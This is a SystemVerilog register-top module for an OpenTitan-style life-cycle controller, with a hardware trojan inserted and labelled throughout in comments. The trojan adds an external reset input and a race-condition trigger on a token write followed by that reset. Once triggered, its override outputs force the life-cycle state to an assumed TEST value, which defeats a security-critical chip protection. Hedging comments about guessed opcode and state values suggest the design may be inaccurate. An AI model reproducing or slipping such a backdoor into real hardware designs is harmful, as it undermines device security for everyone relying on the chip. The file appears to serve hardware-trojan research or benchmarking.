`include "prim_assert.sv"

module lc_ctrl_dmi_reg_top (
  input clk_i,
  input rst_ni,
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,

  // Output port for window
  output tlul_pkg::tl_h2d_t tl_win_o,
  input  tlul_pkg::tl_d2h_t tl_win_i,

  // To HW

  // Integrity check errors
  output logic intg_err_o,

  // Trojan insertion: Add external system reset (trojan-specific)
  input  trojan_sysrst_ni, // <-- Trojan Insertion: external system reset signal

  // Trojan insertion: Connect to Life Cycle State register external control
  output logic [3:0] trojan_lc_state_override, // <-- Trojan Insertion: control Life Cycle state
  output logic       trojan_lc_state_override_en // <-- Trojan Insertion: enable override
);

  import lc_ctrl_reg_pkg::* ;

  // Add an unloaded flop to make use of clock / reset
  // This is done to specifically address lint complaints of unused clocks/resets
  // Since the flop is unloaded it will be removed during synthesis
  logic unused_reg;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      unused_reg <= '0;
    end else begin
      unused_reg <= tl_i.a_valid;
    end
  end

  // Trojan insertion: Capture recent token write event (race condition detection)
  logic trojan_token_write_d, trojan_token_write_q;
  assign trojan_token_write_d = (tl_i.a_valid && tl_i.a_opcode == 3'b0); // assuming opcode==0 is write; adjust as per true spec

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_token_write_q <= 1'b0;
    end else begin
      trojan_token_write_q <= trojan_token_write_d;
    end
  end

  // Trojan insertion: Race condition detector - concurrent token write and external system reset
  logic trojan_triggered;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_triggered <= 1'b0;
    end else begin
      // Race: previous cycle token write + current cycle sysrst assertion
      if (trojan_token_write_q && !trojan_sysrst_ni) begin
        trojan_triggered <= 1'b1;
      end
    end
  end

  // Trojan insertion: Force LC state to TEST state upon trigger, maintain
  localparam [3:0] TROJAN_LC_TEST_STATE = 4'h5; // assume 0x5 is TEST; adjust as per true OpenTitan definition

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_lc_state_override     <= 4'h0;
      trojan_lc_state_override_en  <= 1'b0;
    end else if (trojan_triggered) begin
      trojan_lc_state_override     <= TROJAN_LC_TEST_STATE;
      trojan_lc_state_override_en  <= 1'b1;
    end else begin
      trojan_lc_state_override     <= 4'h0;
      trojan_lc_state_override_en  <= 1'b0;
    end
  end

  // Since there are no registers in this block, commands are routed through to windows which
  // can report their own integrity errors.
  assign intg_err_o = 1'b0;

  // outgoing integrity generation
  tlul_pkg::tl_d2h_t tl_o_pre;
  tlul_rsp_intg_gen #(
    .EnableRspIntgGen(1),
    .EnableDataIntgGen(0)
  ) u_rsp_intg_gen (
    .tl_i(tl_o_pre),
    .tl_o(tl_o)
  );

  assign tl_win_o = tl_i;
  assign tl_o_pre = tl_win_i;

  // Unused signal tieoff
endmodule